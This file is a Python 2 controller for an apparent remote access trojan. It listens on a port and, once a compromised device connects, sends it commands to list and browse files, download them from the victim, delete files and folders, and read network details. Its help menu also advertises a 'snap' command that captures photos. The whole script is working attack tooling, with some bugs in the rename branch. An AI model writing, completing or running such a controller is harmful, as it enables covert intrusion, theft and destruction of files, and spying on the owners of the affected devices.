#coding = 'utf-8'
import socket,sys,os,time
host = sys.argv[1]
port = sys.argv[2]
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print(s.getsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR))
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((host,int(port)))
s.listen(5)
conn, addr = s.accept()
while True:
	p = raw_input("HaSec156@Buntw    : ")
	if "cd " in p:
		fil = p.split()[-1]
		conn.send("cd "+fil)
		print(conn.recv(1024))
	elif p == "cd":
		conn.send("cd")
		print(conn.recv(1024))
	elif "download" in p:
		fil = p.split()[-1]
		conn.send("download "+fil)		
		mess = conn.recv(99999999)
		o = open(fil,"wb")
		o.write(mess)
		o.close()
		print("Downloaded Succesfuly !")
	elif "ls" in p:
		conn.send("ls")
		print(conn.recv(1024))
	elif "mkdir" in p:
		fil = p.split()[-1]
		conn.send("mkdir "+fil)
		print(conn.recv(1024))
	elif "rmdir" in p:
		fil = p.split()[-1]
		conn.send("rmdir "+fil)
		print(conn.recv(1024))
	elif "rm" in p:
		fil = p.split()[-1]
		conn.send("rm "+fil)
		print(conn.recv(1034))
	elif "ifconfig" in p:
		conn.send("ifconfig")
		print(conn.recv(99999))
	elif "exit" in p:
		conn.close()
		s.close()
		sys.exit()
	elif "browse linux" in p:
		conn.send("browse linux")
		print(conn.recv(1024))
	elif "browse sdcard" in p:
		conn.send("browse sdcard")
		print(conn.recv(1024))
	elif "help" in p:
		print("""

	cd             :  BaCk To HOME File
	cd <file>      :  Change Directory
	ls             :  Show All Files
	mkdir          :  Create File
	rmdir          :  Delete File
	rm             :  Delete Anything
	ifconfig       :  Network info
	exit           :  Close Conn And Exit
	browse linux   :  To Browse Files In Browser
	rename <1> <2> :  Rename Anything
	download       :  Download Anything
	snap           :  Capture Photo
  
""")
	elif "rename" in p:
		fil= p[7:]
		fi1 = p[7:].split[-1]
		conn.send('rename {} {}'.format(fil,fil1))
		print(conn.recv(2048))
		
	else:
		print("Invallid Choose!")

